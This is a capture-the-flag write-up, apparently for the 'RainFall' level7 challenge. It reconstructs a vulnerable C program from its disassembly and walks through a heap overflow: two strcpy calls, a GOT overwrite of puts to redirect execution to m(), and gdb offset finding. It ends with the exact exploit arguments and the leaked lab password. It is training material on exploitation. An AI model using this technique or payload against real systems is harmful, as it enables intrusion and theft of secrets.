# Source Code


<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret

Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    edx,0x80486e0
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
</code></pre>
</td>
<td>
<pre><code class="language-c">
char pass[80];

struct person {
    int   id;
    char  *name;
}

int m()
{
  time_t t;

  t = time(0);
  return printf("%s - %d\n", pass, t);
}

int main(int argc, char **argv)
{
  FILE *pass_file;
  void *p1;
  void *p2;

  p1 = malloc(8);
  p1->id = 1;
  p1->name = malloc(8);
  p2 = malloc(8);
  p2 = 2;
  p2->name = malloc(8);
  strcpy(p1->name, argv[1]);
  strcpy(p2->name, argv[2]);
  pass_file = fopen("/home/user/level8/.pass", "r");
  fgets(pass, 68, pass_file);
  puts("~~");
  return 0;
}
</code></pre>
</td>
</tr>
</table>



# Exploring

Like Before, there only a heap buffer overflow due using `strcpy` for copy arguments to its dedicated heap memory allocated block (`malloc`).


### What's Happening in the Code

1. **Memory Allocation and Structures:**
   - Two structures (presumably of type `struct person`) are allocated on the heap.
   - Each structure contains:
     - An `id` field.
     - A pointer `name` that points to a buffer allocated with **8 bytes**.
     
   The memory layout looks like this:

   ```
   +-----------------------------+
   | p1 struct                   |
   |-----------------------------|
   | p1.id         |  p1.name ptr|
   +-----------------------------+
   | p1->name buffer (8 bytes)   |
   +-----------------------------+
   | p2 struct                   |
   |-----------------------------|
   | p2.id         |  p2.name ptr|
   +-----------------------------+
   | p2->name buffer (8 bytes)   |
   +-----------------------------+
   ```

2. **Copying User Input:**
   - The program uses `strcpy(p1->name, argv[1])` to copy the first command-line argument into the 8-byte buffer pointed to by `p1->name`.
   - **Problem:** `strcpy` does not check the length of the source. If `argv[1]` is longer than 8 bytes, it will overflow the allocated buffer.

3. **Overflow Consequence:**
   - The overflow from `p1->name` will spill over into adjacent memory on the heap. In this layout, that adjacent memory includes the structure for `p2`.
   - By carefully crafting `argv[1]`, an attacker can overwrite the value of `p2->name`—which is a pointer—to an address of their choosing (for example, the GOT entry for `puts`).

4. **Arbitrary Write via Second strcpy:**
   - Later, the program calls `strcpy(p2->name, argv[2])`. Under normal circumstances, this copies data into the 8-byte buffer allocated for `p2->name`.
   - However, if the attacker has overwritten `p2->name` to point somewhere else (e.g., to a GOT entry), this call writes attacker-controlled data (from `argv[2]`) to that arbitrary memory location.

5. **Exploiting Control Flow:**
   - Suppose the attacker overwrites the GOT entry for `puts` with the address of function `m()`. When the program later calls `puts("~~")`, it will actually jump to `m()`.
   - The function `m()` then prints the contents of the `pass` buffer (which was read from a password file), thereby leaking sensitive information.


### Visual Walkthrough

Imagine the heap laid out like this:

```
                Heap Memory Layout
                ------------------

[ p1 struct ]
+-----------------------------+
| p1.id         |  p1.name ptr| --> Points to "p1->name buffer"
+-----------------------------+
| p1->name buffer (8 bytes)   |
+-----------------------------+
| p2 struct                   |
+-----------------------------+
| p2.id         |  p2.name ptr| --> Initially points to "p2->name buffer"
+-----------------------------+
| p2->name buffer (8 bytes)   |
+-----------------------------+
```

**Step 1: Overflow p1->name**

- The attacker supplies an `argv[1]` that is longer than 8 bytes.
- The overflow writes past the `p1->name buffer` and overwrites the beginning of the `p2` structure.
- **Result:** The `p2->name` pointer is now under the attacker's control.

**Step 2: Arbitrary Memory Write**

- When `strcpy(p2->name, argv[2])` is executed, the destination is now what the attacker set (e.g., the GOT entry of `puts`).
- **Result:** The attacker writes an address (e.g., the address of `m()`) into the GOT entry.

**Step 3: Hijack Control Flow**

- Finally, the call to `puts("~~")` ends up calling `m()` instead.
- **Result:** The function `m()` prints the secret password and the current time.


# Exploting


get the offset from `p1->name buffer` to `p2.name pointer`:

```
 ❯ python3 tools/cyclic.py -g 25
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A

gdb-peda$ p $eax
$1 = 0x37614136

 ❯ python3 tools/cyclic.py -o 0x37614136
Offset found at: 20
```

The offset is **20**.


Get target address to override `GOT[puts]`.

```
gdb-peda$ x/3i 0x8048400
   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928   <- target address GOT[puts]
   0x8048406 <puts@plt+6>:      push   0x28
   0x804840b <puts@plt+11>:     jmp    0x80483a0
   
gdb-peda$ x/wx 0x8049928
0x8049928 <puts@got.plt>:       0x08048406 <- original value that shall overridden with m() address
```

The `m()` address is `0x080484f4` -> `\xf4\x84\x04\x08`.

So the first agrument is:

```
aaaaaaaaaaaaaaaaaaaa\x28\x99\x04\x08
\__________________/
        20
```

Second one:

```
\xf4\x84\x04\x08
```


The output:

```
level7@RainFall:~$ ./level7 `printf 'aaaaaaaaaaaaaaaaaaaa\x28\x99\x04\x08'` `printf '\xf4\x84\x04\x08'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1739887181
```

We leaked the password, see you in the next challenge `level8`.
